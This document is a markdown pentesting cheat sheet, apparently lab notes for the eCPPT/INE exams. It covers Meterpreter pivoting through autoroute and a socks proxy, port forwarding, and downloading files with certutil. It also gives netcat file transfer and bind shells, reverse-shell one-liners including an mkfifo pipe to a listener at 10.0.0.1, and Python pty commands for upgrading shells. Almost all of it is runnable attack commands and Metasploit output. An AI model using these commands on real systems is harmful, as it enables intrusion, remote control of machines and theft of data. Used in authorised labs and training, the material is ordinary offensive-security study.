# Tricks & Co


# Summary

- [Pivoting](#pivoting)
  - [Meterpreter](#meterpreter)

- [File Transfer](#file-transfer)
  - [Certutil (Windows)](#certutil-windows)
  - [Netcat](#netcat)

- [Bind Shell](#bind-shell)

- [Reverse Shell](#reverse-shell)
  - [Netcat](#netcat-1)
    - [Basic](#basic)
    - [Mkfifo](#mkfifo)

- [Upgrading Shells](#upgrading-shells)


# Pivoting

IF YOU PIVOT, TRY OTHER PAYLOAD LIKE BIND !!

## Meterpreter 

Write UP : [Medium](https://medium.com/@0xMat10/netbios-hacking-ecppt-lab-89ccd871f125)

If you have a meterpreter session, you can pivot with the `autoroute` script :

```bash
meterpreter > run autoroute -s 10.2.30.72/20

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.2.30.72/255.255.240.0...
[+] Added route to 10.2.30.72/255.255.240.0 via 10.2.27.151
[*] Use the -p option to list all active routes
meterpreter >
```

Where `10.2.30.72` is the IP Address accessible only on the network.
Where `/20` is the subnet. Run `ipconfig/ifconfig` on the host to check.

Then, you need to setup a socks proxy :
```bash
# Background your session :
meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(windows/smb/psexec) >

# Use the following Metasploit Module :
msf6 exploit(windows/smb/psexec) > use auxiliary/server/socks_proxy

# Set options :
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050 # Default ProxyChains port
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
VERSION => 4a
msf6 auxiliary(server/socks_proxy) > exploit
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/socks_proxy) >
```

Finally, use **ProxyChains** to use tools like **Nmap**, ... :
```bash
proxychains -q nmap -p445 demo1.ine.local -Pn -sT
```

**USE `-sT`. IF YOU USE SYN SCAN, IT WILL DISPLAY FILTERED !!!**

**Alternative to autoroute script** : 
```bash
# Metasploit Module :
use post/multi/manage/autoroute

# Set options :
set SESSION <ID>
set NETMASK 255.255.240.0
set SUBNET <IP>
set CMD add
```

You will have this message :
```bash
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against ATTACKDEFENSE
[*] Adding a route to 10.2.30.72/255.255.240.0...
[+] Route added to subnet 10.2.30.72/255.255.240.0.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) >
```

## Port Forwarding 

With your meterpreter session, you can forward a remote port : 
```bash
meterpreter > portfwd add -l 10022 -p 22 -r 192.168.0.12
```

Where  :
	- `-l` : Your local port
	- `-p` : Remote port *(Target)*
	- `-r` : Remote host *(Target)*


# File Transfer


## Certutil (Windows)

You can download a file with the `certutil.exe` software :
```cmd
certutil.exe -urlcache -f http://<YOUR-SERVER>/file.exe bad.exe
```

## Netcat

On the target :
```bash
nc -l -p 1234 > out.file
```

Attacker :
```bash
nc -w 3 <IP> <PORT> < file.txt
```

*Works on both Windows and Linux.*


# Bind Shell

When the attacker connect itself to the target.

Target :
```bash
# Windows : 
.\nc.exe -lvnp 1234 -e cmd.exe

# Linux :
nc -lvnp 1234 -e /bin/sh
```

Attacker :
```bash
nc -vn <IP> <PORT>
```

# Reverse Shell

## Netcat

### Basic

Setup a listener with :
```bash
nc -lvnp 1234
```

Connect to attacker with : 
```bash
# Linux :
nc -e /bin/sh <IP> <PORT>

# Windows :
.\nc.exe -e cmd.exe <IP> <PORT>
```

### Mkfifo

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```


# Upgrading Shells

- Spawn interactive shell :
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
export TERM=xterm
export SHELL=bash
```
